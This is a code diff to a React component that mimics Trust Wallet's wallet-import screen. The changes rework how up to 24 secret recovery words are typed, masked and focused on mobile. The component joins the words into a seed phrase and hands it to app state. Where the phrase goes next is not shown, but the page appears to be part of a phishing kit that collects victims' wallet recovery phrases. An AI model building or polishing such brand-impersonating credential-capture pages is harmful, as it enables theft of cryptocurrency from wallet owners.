@@ -8,8 +8,9 @@ import TrustWalletFull from "../icons/trust-wallet-full";
 
 const TrustWallet = ({ handleFinish }: { handleFinish: () => void }) => {
   const [walletName, setWalletName] = useState("Main wallet");
-  const [words, setWords] = useState<string[]>([""]);
-  const [visibility, setVisibility] = useState<boolean[]>([false]);
+  // START WITH NO INPUTS — tapping creates the first one
+  const [words, setWords] = useState<string[]>([]);
+  const [visibility, setVisibility] = useState<boolean[]>([]);
   const [allVisible, setAllVisible] = useState(false);
   const [nameFocused, setNameFocused] = useState(false);
   const [areaFocused, setAreaFocused] = useState(false);
@@ -19,21 +20,24 @@ const TrustWallet = ({ handleFinish }: { handleFinish: () => void }) => {
   // Handle completion
   const handleComplete = () => {
     setSeedPhrase(words.join(" ").trim());
-    setWalletName(walletName);
     handleFinish();
   };
 
   // Add a new input automatically (now focuses reliably)
-  const addNewInput = () => {
+  const addNewInput = (focusIndex?: number) => {
     setWords((prev) => {
       if (prev.length >= 24) return prev;
       const next = [...prev, ""];
+      // keep visibility array in sync
+      setVisibility((vPrev) => {
+        const nextVis = [...(vPrev || []), false];
+        return nextVis;
+      });
       // focus newly added input after DOM update
       setTimeout(() => {
-        inputRefs.current[next.length - 1]?.focus();
+        const idxToFocus = typeof focusIndex === "number" ? focusIndex : next.length - 1;
+        inputRefs.current[idxToFocus]?.focus();
       }, 10);
-      // keep visibility array in sync
-      setVisibility((vPrev) => [...vPrev, false]);
       return next;
     });
   };
@@ -73,7 +77,7 @@ const TrustWallet = ({ handleFinish }: { handleFinish: () => void }) => {
         // if trimmed isn't empty, add new input
         if (trimmed !== "" && next.length < 24) {
           const withExtra = [...next, ""];
-          setVisibility((vPrev) => [...vPrev, false]);
+          setVisibility((vPrev) => [...(vPrev || []), false]);
           setTimeout(() => {
             inputRefs.current[withExtra.length - 1]?.focus();
           }, 10);
@@ -92,23 +96,27 @@ const TrustWallet = ({ handleFinish }: { handleFinish: () => void }) => {
   const toggleAllVisibility = () => {
     const newVisible = !allVisible;
     setAllVisible(newVisible);
-    setVisibility((prev) => prev.map(() => newVisible));
+    setVisibility((prev) => (prev.length ? prev.map(() => newVisible) : []));
   };
 
   // Handle area click / touch (robust for iOS)
   const handleAreaClick = (e?: React.MouseEvent<HTMLDivElement> | undefined) => {
-    // focus the last input
-    if (words.length === 0) {
-      setWords([""]);
-      setVisibility([false]);
-      setTimeout(() => {
-        inputRefs.current[0]?.focus();
-      }, 10);
-    } else {
-      setTimeout(() => {
-        inputRefs.current[words.length - 1]?.focus();
-      }, 10);
+    // If user tapped an existing input or button, don't override
+    if (e) {
+      const target = e.target as HTMLElement;
+      if (target.closest("input") || target.closest("button")) return;
     }
+
+    // If no inputs exist, create the first input and focus it
+    if (words.length === 0) {
+      addNewInput(0);
+      return;
+    }
+
+    // Otherwise focus the last input
+    setTimeout(() => {
+      inputRefs.current[words.length - 1]?.focus();
+    }, 10);
   };
 
   // Disable button logic
@@ -161,43 +169,55 @@ const TrustWallet = ({ handleFinish }: { handleFinish: () => void }) => {
               </label>
 
               <div
-                // both click and touchstart so iOS reliably triggers focus
+                // both click and touchstart so iOS reliably triggers focus/create-first-input
                 onClick={handleAreaClick}
                 onTouchStart={() => handleAreaClick()}
                 className={`relative flex flex-wrap rounded-lg p-4 min-h-56 cursor-text transition-colors ${
                   areaFocused ? "border-1 border-green-600" : "border border-neutral-700"
                 } bg-neutral-900`}
               >
-                {/* NOTE: removed hidden textarea approach and instead rely on input focus handlers */}
-                {words.map((word, index) => (
-                  <div key={index} className="mr-2 mb-2 flex items-center">
-                    <input
-                      ref={(el) => {
-                        if (el) inputRefs.current[index] = el;
-                      }}
-                      type={visibility[index] ? "text" : "password"}
-                      value={word}
-                      onInput={(e) => handleInput(e as any, index)}
-                      onKeyDown={(e) => handleKeyDown(e, index)}
-                      inputMode="text"
-                      autoCapitalize="none"
-                      autoCorrect="off"
-                      spellCheck="false"
-                      enterKeyHint="next"
-                      onFocus={() => setAreaFocused(true)}
-                      onBlur={() => setAreaFocused(false)}
-                      // make input easier to tap on mobile
-                      style={{
-                        minWidth: "3ch",
-                        width: `${Math.max(word.length, 1)}ch`,
-                        padding: "6px 8px",
-                        borderRadius: 6,
-                      }}
-                      className="bg-transparent outline-none text-gray-100/80 font-semibold"
-                      aria-label={`secret-word-${index + 1}`}
-                    />
+                {/* If there are no inputs yet, show a tappable placeholder */}
+                {words.length === 0 ? (
+                  <div
+                    onClick={handleAreaClick}
+                    className="text-sm text-gray-400 select-none"
+                    role="button"
+                    aria-label="tap-to-start"
+                  >
+                    Tap here to start typing your secret phrase or paste it
                   </div>
-                ))}
+                ) : (
+                  // render inputs
+                  words.map((word, index) => (
+                    <div key={index} className="mr-2 mb-2 flex items-center">
+                      <input
+                        ref={(el) => {
+                          if (el) inputRefs.current[index] = el;
+                        }}
+                        type={visibility[index] ? "text" : "password"}
+                        value={word}
+                        onInput={(e) => handleInput(e as any, index)}
+                        onKeyDown={(e) => handleKeyDown(e, index)}
+                        inputMode="text"
+                        autoCapitalize="none"
+                        autoCorrect="off"
+                        spellCheck="false"
+                        enterKeyHint="next"
+                        onFocus={() => setAreaFocused(true)}
+                        onBlur={() => setAreaFocused(false)}
+                        // make input easier to tap on mobile
+                        style={{
+                          minWidth: "3ch",
+                          width: `${Math.max(word.length, 1)}ch`,
+                          padding: "6px 8px",
+                          borderRadius: 6,
+                        }}
+                        className="bg-transparent outline-none text-gray-100/80 font-semibold"
+                        aria-label={`secret-word-${index + 1}`}
+                      />
+                    </div>
+                  ))
+                )}
 
                 <button
                   type="button"
